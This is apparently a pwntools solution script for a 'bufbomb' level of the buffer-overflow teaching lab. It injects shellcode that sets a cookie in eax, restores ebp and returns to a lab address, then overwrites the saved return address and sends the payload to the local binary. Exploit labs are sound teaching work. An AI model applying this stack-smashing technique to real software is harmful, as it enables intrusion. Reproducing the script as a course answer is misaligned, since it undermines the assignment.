from pwn import *

with open('./ID', 'r') as f:
    id = f.read().splitlines()[0]

sh = process(['./bufbomb', '-u', id])

length = 32
ebp = 0x556834a0
ret = 0x08048e81
cookie = 0x274adc8a
distance = 0x28 # distance from esp to previous ebp

shellcode = asm('mov eax, {}; lea ebp, [esp + {}]; push {}; ret;'.format(cookie, distance, ret))

exploit = flat([shellcode.ljust(length + 8, 'a'), 0xdeadbeef, ebp - length - 8])

with open('./boom_{}.txt'.format(id), 'w') as f:
    f.write(' '.join(char.encode('hex') for char in exploit))

sh.sendline(exploit)

sh.interactive()
